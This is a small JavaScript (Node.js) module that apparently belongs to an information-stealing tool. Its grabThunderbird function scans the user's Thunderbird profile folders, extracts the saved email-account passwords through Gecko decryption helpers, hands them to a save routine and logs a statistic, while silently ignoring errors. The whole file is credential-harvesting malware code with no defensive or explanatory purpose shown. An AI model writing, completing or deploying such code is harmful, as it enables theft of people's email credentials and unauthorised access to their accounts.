const path = require("path");
const browsers = require("./browsers");
const save = require("./save");
const { stat } = require("./stats");

async function grabThunderbird() {
    var accounts = []
    try {
        const profiles = browsers.getGeckoProfiles(path.join(process.env.appdata, "Thunderbird", "Profiles\\"), "Thunderbird");
        for (let i = 0 ; i < profiles.length; i++) {
            const profile = profiles[i];
            
            let found = await browsers.getGeckoPasswords(profile.path, "");
            accounts = accounts.concat(found);
        }
    } catch (e) { }

    if (accounts.length > 0) {
        save.saveMailClients(accounts, "Thunderbird");
        stat.AddMessenger("Thunderbird");
    }
}

module.exports = {
    grabThunderbird
}